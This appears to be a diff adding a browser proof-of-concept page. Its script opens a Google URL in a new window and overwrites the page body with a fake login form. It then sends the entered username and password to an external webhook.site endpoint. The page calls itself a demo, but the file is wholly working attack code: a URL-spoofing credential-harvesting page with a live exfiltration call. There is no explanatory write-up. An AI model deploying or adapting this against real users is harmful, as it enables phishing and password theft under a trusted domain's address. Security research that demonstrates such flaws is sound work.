@@ -1,0 +1,34 @@
+
+<script>
+const WEBHOOK_URL = "https://webhook.site/fdac81ab-e426-4997-9b3d-514d7f41b767";
+
+function go() {
+var x=window.open('https://www.google.com/csi')
+
+    setTimeout(function() {
+        x.document.body.innerHTML = `
+            <h1>This is not Google!</h1>
+            <h1>Demo Login</h1>
+            Username: <input id="username" placeholder="testuser"><br>
+            Password: <input id="password" type="password" placeholder="password"><br>
+            <button id="btnLogin">Login</button>
+            <p id="status"></p>
+        `;
+
+        x.document.getElementById("btnLogin").onclick = function() {
+            const username = x.document.getElementById('username').value;
+            const password = x.document.getElementById('password').value;
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({ username, password, time: new Date().toISOString() })
+            });
+
+            x.document.getElementById("status").innerText = "Data demo dikirim ke webhook dummy.";
+            console.log("Data demo:", { username, password });
+        };
+    }, 500);
+}
+</script>
+
+<button onclick="go()">Click to PoC</button>
